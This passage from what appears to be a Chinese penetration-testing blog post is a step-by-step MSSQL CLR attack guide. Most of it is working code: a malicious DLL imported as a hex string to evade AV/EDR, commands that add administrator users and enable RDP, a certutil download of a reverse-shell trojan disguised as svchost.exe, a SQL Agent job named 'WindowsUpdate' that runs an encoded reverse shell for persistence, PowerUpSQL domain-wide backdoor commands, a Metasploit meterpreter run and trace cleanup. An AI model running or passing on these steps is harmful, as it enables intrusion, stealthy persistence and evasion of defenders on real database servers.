+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 csc.exe 路径</span></span><br><span class="line"><span class="built_in">Get-ChildItem</span> <span class="literal">-Recurse</span> <span class="string">&quot;C:\Windows\Microsoft.NET&quot;</span> <span class="literal">-Filter</span> <span class="string">&quot;csc.exe&quot;</span> |</span><br><span class="line">    <span class="built_in">Sort-Object</span> FullName <span class="literal">-Descending</span> | <span class="built_in">Select-Object</span> FullName <span class="literal">-First</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 常用路径（64位 .NET 4.x）</span></span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\csc.exe /target:library C:\temp\cmd_exec.cs</span><br></pre></td></tr></table></figure>
+
+<p>编译后在 <code>C:\temp\</code> 生成 <code>cmd_exec.dll</code>。</p>
+<blockquote>
+<p><strong>场景变体：</strong> 如果目标服务器无法直接写文件，可以在本地 Kali 安装 <code>mono-mcs</code> 编译：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install mono-mcs</span><br><span class="line">mcs -target:library -out:cmd_exec.dll cmd_exec.cs</span><br></pre></td></tr></table></figure></blockquote>
+<h3 id="3-3-有文件导入-—-将-DLL-写入服务器后导入"><a href="#3-3-有文件导入-—-将-DLL-写入服务器后导入" class="headerlink" title="3.3 有文件导入 — 将 DLL 写入服务器后导入"></a>3.3 有文件导入 — 将 DLL 写入服务器后导入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">USE msdb;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 通过 xp_cmdshell 或其他方式将 DLL 传到服务器后导入</span></span><br><span class="line"><span class="keyword">CREATE</span> ASSEMBLY [cmd_exec_asm]</span><br><span class="line"><span class="keyword">FROM</span> <span class="string">&#x27;C:\temp\cmd_exec.dll&#x27;</span></span><br><span class="line"><span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将 DLL 中的方法映射为存储过程</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> [dbo].[cmd_exec]</span><br><span class="line">    <span class="variable">@execCommand</span> NVARCHAR(<span class="number">4000</span>)</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">EXTERNAL</span> NAME [cmd_exec_asm].[StoredProcedures].[cmd_exec];</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-4-无文件导入-—-十六进制字符串直接创建"><a href="#3-4-无文件导入-—-十六进制字符串直接创建" class="headerlink" title="3.4 无文件导入 — 十六进制字符串直接创建"></a>3.4 无文件导入 — 十六进制字符串直接创建</h3><p>为避免触发磁盘层 AV&#x2F;EDR，将 DLL 转换为十六进制字符串直接执行：</p>
+<p><strong>步骤一：PowerShell 生成十六进制导入脚本</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$assemblyFile</span> = <span class="string">&quot;C:\temp\cmd_exec.dll&quot;</span></span><br><span class="line"><span class="variable">$builder</span> = <span class="built_in">New-Object</span> System.Text.StringBuilder</span><br><span class="line"></span><br><span class="line"><span class="variable">$builder</span>.AppendLine(<span class="string">&quot;CREATE ASSEMBLY [cmd_exec_asm] AUTHORIZATION [dbo] FROM &quot;</span>)</span><br><span class="line"><span class="variable">$builder</span>.Append(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.IO.File</span>]::ReadAllBytes(<span class="variable">$assemblyFile</span>)</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$b</span> <span class="keyword">in</span> <span class="variable">$bytes</span>) &#123;</span><br><span class="line">    <span class="variable">$builder</span>.Append(<span class="variable">$b</span>.ToString(<span class="string">&quot;X2&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$builder</span>.AppendLine()</span><br><span class="line"><span class="variable">$builder</span>.AppendLine(<span class="string">&quot;WITH PERMISSION_SET = UNSAFE;&quot;</span>)</span><br><span class="line"><span class="variable">$builder</span>.AppendLine(<span class="string">&quot;GO&quot;</span>)</span><br><span class="line"><span class="variable">$builder</span>.AppendLine(<span class="string">&quot;CREATE PROCEDURE [dbo].[cmd_exec] @execCommand NVARCHAR(4000) &quot;</span>)</span><br><span class="line"><span class="variable">$builder</span>.AppendLine(<span class="string">&quot;AS EXTERNAL NAME [cmd_exec_asm].[StoredProcedures].[cmd_exec];&quot;</span>)</span><br><span class="line"><span class="variable">$builder</span>.AppendLine(<span class="string">&quot;GO&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$builder</span>.ToString() | <span class="built_in">Out-File</span> <span class="literal">-FilePath</span> C:\temp\cmd_exec_hex.txt <span class="literal">-Encoding</span> ASCII</span><br><span class="line"><span class="built_in">Write-Host</span> <span class="string">&quot;[+] Hex import script generated: C:\temp\cmd_exec_hex.txt&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤二：在 SQL 客户端执行生成的脚本</strong></p>
+<p>生成的 SQL 脚本格式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ASSEMBLY [cmd_exec_asm] <span class="keyword">AUTHORIZATION</span> [dbo] <span class="keyword">FROM</span></span><br><span class="line"><span class="number">0x4D5A90000300000004000000FFFF0000B8000000000000</span>...(完整DLL十六进制)</span><br><span class="line"><span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line">GO</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">PROCEDURE</span> [dbo].[cmd_exec] <span class="variable">@execCommand</span> NVARCHAR(<span class="number">4000</span>)</span><br><span class="line"><span class="keyword">AS</span> <span class="keyword">EXTERNAL</span> NAME [cmd_exec_asm].[StoredProcedures].[cmd_exec];</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>优势：</strong> 不落盘 DLL，绕过文件监控；适合只掌握 SQL 客户端连接（如 SQLCMD &#x2F; SSMS &#x2F; Navicat）的场景。</p>
+</blockquote>
+<h3 id="3-5-执行系统命令"><a href="#3-5-执行系统命令" class="headerlink" title="3.5 执行系统命令"></a>3.5 执行系统命令</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基础命令执行</span></span><br><span class="line"><span class="keyword">EXEC</span> [dbo].[cmd_exec] <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看当前用户权限</span></span><br><span class="line"><span class="keyword">EXEC</span> [dbo].[cmd_exec] <span class="string">&#x27;whoami /priv&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 添加管理员用户</span></span><br><span class="line"><span class="keyword">EXEC</span> [dbo].[cmd_exec] <span class="string">&#x27;net user pentest Passw0rd! /add&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> [dbo].[cmd_exec] <span class="string">&#x27;net localgroup Administrators pentest /add&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 开启 RDP（3389）</span></span><br><span class="line"><span class="keyword">EXEC</span> [dbo].[cmd_exec] <span class="string">&#x27;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 下载反弹 Shell 木马</span></span><br><span class="line"><span class="keyword">EXEC</span> [dbo].[cmd_exec] <span class="string">&#x27;certutil -urlcache -split -f http://攻击机IP/shell.exe C:\Windows\Temp\svchost.exe &amp;&amp; C:\Windows\Temp\svchost.exe&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="四、后渗透与持久化"><a href="#四、后渗透与持久化" class="headerlink" title="四、后渗透与持久化"></a>四、后渗透与持久化</h2><h3 id="4-1-导出已有-CLR-程序集-→-修改-→-回写"><a href="#4-1-导出已有-CLR-程序集-→-修改-→-回写" class="headerlink" title="4.1 导出已有 CLR 程序集 → 修改 → 回写"></a>4.1 导出已有 CLR 程序集 → 修改 → 回写</h3><p>利用 <strong>dnSpy</strong> 反编译现有程序集，注入后门后通过 <code>ALTER ASSEMBLY</code> 替换（不中断现有会话）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 导出程序集二进制内容</span></span><br><span class="line"><span class="keyword">SELECT</span> af.content <span class="keyword">FROM</span> sys.assembly_files af</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> sys.assemblies a <span class="keyword">ON</span> af.assembly_id <span class="operator">=</span> a.assembly_id</span><br><span class="line"><span class="keyword">WHERE</span> a.name <span class="operator">=</span> <span class="string">&#x27;target_assembly&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将导出的 varbinary 另存为 DLL</span></span><br><span class="line"><span class="comment">-- 用 dnSpy 修改 → 修改 MVID 一个字节 → 回写</span></span><br><span class="line"><span class="keyword">ALTER</span> ASSEMBLY [target_assembly]</span><br><span class="line"><span class="keyword">FROM</span> <span class="number">0x4D5A90</span>...(修改后的十六进制)</span><br><span class="line"><span class="keyword">WITH</span> PERMISSION_SET <span class="operator">=</span> UNSAFE;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-创建持久化定时任务"><a href="#4-2-创建持久化定时任务" class="headerlink" title="4.2 创建持久化定时任务"></a>4.2 创建持久化定时任务</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 利用 SQL Agent Job 定期反弹 Shell</span></span><br><span class="line">USE msdb;</span><br><span class="line"><span class="keyword">EXEC</span> sp_add_job <span class="variable">@job_name</span> <span class="operator">=</span> <span class="string">&#x27;WindowsUpdate&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_add_jobstep </span><br><span class="line">    <span class="variable">@job_name</span> <span class="operator">=</span> <span class="string">&#x27;WindowsUpdate&#x27;</span>,</span><br><span class="line">    <span class="variable">@step_name</span> <span class="operator">=</span> <span class="string">&#x27;payload&#x27;</span>,</span><br><span class="line">    <span class="variable">@command</span> <span class="operator">=</span> <span class="string">&#x27;EXEC cmd_exec &#x27;&#x27;powershell -enc &lt;Base64编码命令&gt;&#x27;&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_add_jobschedule </span><br><span class="line">    <span class="variable">@job_name</span> <span class="operator">=</span> <span class="string">&#x27;WindowsUpdate&#x27;</span>,</span><br><span class="line">    <span class="variable">@name</span> <span class="operator">=</span> <span class="string">&#x27;DailyRun&#x27;</span>,</span><br><span class="line">    <span class="variable">@freq_type</span> <span class="operator">=</span> <span class="number">4</span>,       <span class="comment">-- 每天</span></span><br><span class="line">    <span class="variable">@freq_interval</span> <span class="operator">=</span> <span class="number">1</span>,</span><br><span class="line">    <span class="variable">@active_start_time</span> <span class="operator">=</span> <span class="number">090000</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_add_jobserver <span class="variable">@job_name</span> <span class="operator">=</span> <span class="string">&#x27;WindowsUpdate&#x27;</span>;</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、工具化利用"><a href="#五、工具化利用" class="headerlink" title="五、工具化利用"></a>五、工具化利用</h2><h3 id="5-1-PowerUpSQL"><a href="#5-1-PowerUpSQL" class="headerlink" title="5.1 PowerUpSQL"></a>5.1 PowerUpSQL</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="built_in">Import-Module</span> PowerUpSQL.psd1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成 CLR DLL 和 TSQL 导入脚本（一步到位）</span></span><br><span class="line">Create<span class="literal">-SQLFileCLRDll</span> <span class="literal">-ProcedureName</span> <span class="string">&quot;runcmd&quot;</span> <span class="literal">-OutFile</span> runcmd <span class="literal">-OutDir</span> C:\temp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 远程自动执行（自动处理 CLR 启用和导入）</span></span><br><span class="line"><span class="built_in">Invoke-SQLOSCmdCLR</span> <span class="literal">-Username</span> sa <span class="literal">-Password</span> <span class="string">&#x27;P@ssw0rd&#x27;</span> `</span><br><span class="line">    <span class="literal">-Instance</span> SRV01\SQLEXPRESS <span class="literal">-Command</span> <span class="string">&quot;whoami&quot;</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 大规模枚举域内 SQL Server 并执行</span></span><br><span class="line"><span class="built_in">Get-SQLInstanceDomain</span> | <span class="built_in">Invoke-SQLOSCmdCLR</span> `</span><br><span class="line">    <span class="literal">-Command</span> <span class="string">&#x27;net user backdoor P@ssw0rd! /add&#x27;</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-Metasploit"><a href="#5-2-Metasploit" class="headerlink" title="5.2 Metasploit"></a>5.2 Metasploit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/mssql/mssql_clr_payload</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> RHOSTS 192.168.1.100</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> USERNAME sa</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> PASSWORD P@ssw0rd</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> LHOST 192.168.1.50</span><br><span class="line">msf6 &gt; <span class="built_in">set</span> LPORT 4444</span><br><span class="line">msf6 &gt; run</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>执行后获得 Meterpreter 会话，权限为 <code>NT SERVICE\MSSQLSERVER</code> 或 <code>NT AUTHORITY\SYSTEM</code>。</p>
+</blockquote>
+<h3 id="5-3-SQLWinds-交互式工具包"><a href="#5-3-SQLWinds-交互式工具包" class="headerlink" title="5.3 SQLWinds 交互式工具包"></a>5.3 SQLWinds 交互式工具包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内存中加载 CLR（无文件痕迹）</span></span><br><span class="line">:memclr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启用 CLR 支持</span></span><br><span class="line">:enable_clr</span><br><span class="line"></span><br><span class="line"><span class="comment"># 部署 CLR Payload</span></span><br><span class="line">:deploy-clr</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="六、清理痕迹"><a href="#六、清理痕迹" class="headerlink" title="六、清理痕迹"></a>六、清理痕迹</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 删除存储过程和程序集</span></span><br><span class="line">USE msdb;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">PROCEDURE</span> IF <span class="keyword">EXISTS</span> [dbo].[cmd_exec];</span><br><span class="line"><span class="keyword">DROP</span> ASSEMBLY IF <span class="keyword">EXISTS</span> [cmd_exec_asm];</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 恢复安全配置</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr enabled&#x27;</span>, <span class="number">0</span>;</span><br><span class="line"><span class="keyword">EXEC</span> sp_configure <span class="string">&#x27;clr strict security&#x27;</span>, <span class="number">1</span>;</span><br><span class="line">RECONFIGURE;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="攻击链路总结"><a href="#攻击链路总结" class="headerlink" title="攻击链路总结"></a>攻击链路总结</h2><pre class="mermaid">flowchart LR
+    A[SQL Server 凭据获取] --> B[检查/开启 CLR + Trustworthy]
+    B --> C[编写 cmd_exec.cs<br/>C# 恶意 DLL 源码]
+    C --> D[编译为 DLL<br/>csc.exe / mcs]
+    D --> E{导入方式}
+    E -->|有文件导入| F1[CREATE ASSEMBLY<br/>FROM DLL路径]
+    E -->|无文件导入| F2[CREATE ASSEMBLY<br/>FROM 0xHEX字符串]
+    F1 --> G[CREATE PROCEDURE 映射]
+    F2 --> G
+    G --> H[EXEC 执行系统命令]
+    H --> I[获得 OS 层代码执行权]</pre>
+
+<h2 id="核心知识点"><a href="#核心知识点" class="headerlink" title="核心知识点"></a>核心知识点</h2><ul>
+<li>CLR 程序集的 <code>UNSAFE</code> 权限集可突破 SQL Server 沙箱执行 OS 命令</li>
+<li>执行上下文为 <strong>SQL Server 服务账户</strong>（常见 <code>NT SERVICE\MSSQLSERVER</code> 或 <code>NT AUTHORITY\SYSTEM</code>）</li>
+<li>十六进制字符串导入方式（<code>FROM 0x...</code>）可绕过 AV&#x2F;EDR 文件监控</li>
+<li><code>ALTER ASSEMBLY</code> 比 <code>DROP + CREATE</code> 更隐蔽，不中断现有连接</li>
+<li><code>db_ddladmin</code> 角色即具备 <code>ALTER ASSEMBLY</code> 权限，不一定要 sysadmin</li>
+<li>SQL Server 2017+ 的 <code>clr strict security</code> 增加了利用难度，但仍可配合证书签名绕过</li>
+<li>结合 SQL Agent Job 可实现持久化定时任务</li>
+</ul>
+<hr>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/" rel="tag"># 数据库安全</a>
+              <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/" rel="tag"># 权限提升</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Linux-privesc-cron-path/" rel="prev" title="Linux提权：Cron计划任务与PATH劫持">
+                  <i class="fa fa-angle-left"></i> Linux提权：Cron计划任务与PATH劫持
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/SQL-injection-time-based/" rel="next" title="SQL 注入：时间盲注详解">
+                  SQL 注入：时间盲注详解 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
